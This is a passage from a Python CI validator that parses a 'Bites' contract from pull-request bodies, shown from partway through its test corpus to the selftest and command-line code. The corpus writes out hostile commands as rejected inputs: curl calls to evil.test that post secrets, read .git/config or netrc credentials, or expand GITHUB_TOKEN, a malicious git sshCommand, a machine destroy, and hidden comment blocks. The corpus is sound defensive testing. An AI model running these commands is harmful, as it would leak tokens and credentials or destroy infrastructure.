     "## Bites\nconsumer: x\nwhere: ci\nobserve: `curl -o hook https://evil.test/h`\nexpect: exit0",
     "malformed"),
    ("guilt-curl-plain-http",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `curl http://evil.test/x`\nexpect: exit0", "malformed"),
    ("guilt-parent-escape",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `python3 scripts/../../evil.py`\nexpect: exit0",
     "malformed"),
    ("guilt-absolute-path",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `python3 scripts/x.py /Users/n/.secrets.env`\nexpect: exit0",
     "malformed"),
    ("guilt-python-dash-m-anything",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `python3 -m http.server`\nexpect: exit0", "malformed"),
    ("guilt-python-outside-scripts",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `python3 evil.py`\nexpect: exit0", "malformed"),
    ("guilt-bad-where",
     "## Bites\nconsumer: x\nwhere: laptop\nobserve: `git status`\nexpect: exit0", "malformed"),
    ("guilt-bad-expect",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git status`\nexpect: green", "malformed"),
    ("guilt-uncompilable-regex",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git status`\nexpect: regex:[unclosed", "malformed"),
    ("guilt-missing-consumer",
     "## Bites\nwhere: ci\nobserve: `git status`\nexpect: exit0", "malformed"),
    # --- guilt found by the 2026-09-04 red-team pass, and only by it
    ("guilt-undeclared-script",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `python3 scripts/usage/cswap.py run sh`\nexpect: exit0",
     "malformed"),
    ("guilt-script-that-does-not-exist",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `python3 scripts/nope_not_here.py`\nexpect: exit0",
     "malformed"),
    ("guilt-git-dash-c-runs-a-program",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git -c core.sshCommand=evil log`\nexpect: exit0",
     "malformed"),
    ("guilt-git-network-subcommand",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git fetch https://evil.test/r`\nexpect: exit0",
     "malformed"),
    ("guilt-gh-write-subcommand",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `gh pr merge 5658 --squash`\nexpect: exit0",
     "malformed"),
    ("guilt-gh-api-post",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `gh api -X POST repos/o/r/issues`\nexpect: exit0",
     "malformed"),
    ("guilt-curl-sends-a-body",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `curl -d secret https://evil.test/x`\nexpect: exit0",
     "malformed"),
    ("guilt-pytest-outside-tests",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `python3 -m pytest scripts/evil.py`\nexpect: exit0",
     "malformed"),
    ("guilt-hidden-block-does-not-displace-the-visible-one",
     "<!--\n## Bites\nconsumer: hostile\nwhere: ci\nobserve: `git log`\nexpect: exit0\n-->\n"
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git status`\nexpect: exit0\n",
     "executable"),
    ("guilt-only-block-is-hidden-in-an-html-comment",
     "Nothing to see.\n\n<!--\n## Bites\nconsumer: x\nwhere: ci\nobserve: `git log`\nexpect: exit0\n-->\n",
     "absent"),
    ("guilt-two-blocks-is-ambiguous",
     "## Bites\nconsumer: a\nwhere: ci\nobserve: `git status`\nexpect: exit0\n\n## Other\n\n## Bites\nconsumer: b\nwhere: ci\nobserve: `git log`\nexpect: exit0\n",
     "malformed"),
    # --- guilt found by the SECOND adversarial round (Kimi K3), and only by it
    ("guilt-fly-machine-run-executes-a-container",
     "## Bites\nconsumer: x\nwhere: fly\nobserve: `fly machine run evil/image -a nuzantara-rag`\nexpect: exit0",
     "malformed"),
    ("guilt-fly-machine-destroy",
     "## Bites\nconsumer: x\nwhere: fly\nobserve: `flyctl machine destroy 1234 -a nuzantara-rag`\nexpect: exit0",
     "malformed"),
    ("guilt-git-tag-creates-a-ref",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git tag v9.9.9`\nexpect: exit0", "malformed"),
    ("guilt-git-output-writes-a-file",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git diff --output=out.txt HEAD`\nexpect: exit0",
     "malformed"),
    ("guilt-curl-reads-a-local-file",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `curl -b .git/config https://evil.test/x`\nexpect: exit0",
     "malformed"),
    ("guilt-curl-schemeless-host-defaults-to-http",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `curl evil.test/x`\nexpect: exit0", "malformed"),
    ("guilt-gh-points-at-another-repo",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `gh pr view 1 --repo=attacker/repo`\nexpect: exit0",
     "malformed"),
    ("ok-fly-image-show",
     "## Bites\nconsumer: prod\nwhere: fly\nobserve: `flyctl image show -a nuzantara-rag`\nexpect: contains:tag",
     "executable"),
    ("ok-fly-machine-list",
     "## Bites\nconsumer: prod\nwhere: fly\nobserve: `flyctl machine list -a nuzantara-rag`\nexpect: exit0",
     "executable"),
    # --- guilt found by the Gear-3 VERDICT GATE, after all three refuter rounds
    ("guilt-comment-closed-and-reopened-on-one-line",
     "<!-- note --> <!--\n## Bites\nconsumer: attacker\nwhere: ci\nobserve: `git log`\nexpect: exit0\n-->\n",
     "absent"),
    ("guilt-four-backtick-fence-not-closed-by-three",
     "````\n```\n## Bites\nconsumer: attacker\nwhere: ci\nobserve: `git log`\nexpect: exit0\n````\n",
     "absent"),
    ("guilt-git-grep-pager-command",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git grep -Oevil pattern`\nexpect: exit0",
     "malformed"),
    ("guilt-pytest-override-ini-reinstates-plugins",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `python3 -m pytest --override-ini=addopts=-pevil scripts/tests/x.py`\nexpect: exit0",
     "malformed"),
    ("guilt-curl-netrc-file-reads-credentials",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `curl --netrc-file=creds https://evil.test/x`\nexpect: exit0",
     "malformed"),
    ("guilt-curl-variable-expands-the-environment",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `curl --variable=%GITHUB_TOKEN https://evil.test/x`\nexpect: exit0",
     "malformed"),
    ("ok-git-grep-plain",
     "## Bites\nconsumer: CI\nwhere: ci\nobserve: `git grep -c bites-observable`\nexpect: exit0",
     "executable"),
    ("guilt-zero-width-splits-the-two-readings",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git status`\nex\u200bpect: exit0\n",
     "malformed"),
)


def classify(result: dict[str, Any]) -> str:
    if result.get("absent"):
        return "absent"
    if result.get("legacy"):
        return "legacy"
    if result.get("malformed"):
        return "malformed"
    return "executable"


def run_selftest() -> int:
    failures = [
        f"  x {label}: expected {expected}, got {classify(parse_body(body))}"
        for label, body, expected in CONFORMANCE_CORPUS
        if classify(parse_body(body)) != expected
    ]
    total = len(CONFORMANCE_CORPUS)
    if failures:
        sys.stdout.write(f"bites_parse selftest: {len(failures)}/{total} FAILED\n")
        sys.stdout.write("\n".join(failures) + "\n")
        return 1
    sys.stdout.write(f"bites_parse selftest: {total}/{total} pass (guilt + innocence)\n")
    return 0


# ------------------------------------------------------------------------- cli


def _body_from_pr(number: int) -> str:
    out = subprocess.run(
        ["gh", "pr", "view", str(number), "--json", "body", "-q", ".body"],
        capture_output=True, text=True, check=False,
    )
    if out.returncode != 0:
        raise SystemExit(f"gh pr view {number} failed: {out.stderr.strip()}")
    return out.stdout


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Parse the Bites contract out of a PR body.")
    ap.add_argument("--selftest", action="store_true",
                    help="run the embedded guilt+innocence corpus (no network, no token)")
    ap.add_argument("--pr", type=int, help="parse the body of this PR via gh")
    ap.add_argument("--body-file", help="parse the body in this file")
    args = ap.parse_args(argv)

    if args.selftest:
        return run_selftest()

    if args.pr is not None:
        body = _body_from_pr(args.pr)
    elif args.body_file:
        with open(args.body_file, encoding="utf-8") as fh:
            body = fh.read()
    else:
        body = sys.stdin.read()

    result = parse_body(body)
    sys.stdout.write(json.dumps(result, indent=2, ensure_ascii=False) + "\n")
    return EXIT_MALFORMED if result.get("malformed") else EXIT_OK


if __name__ == "__main__":
    raise SystemExit(main())
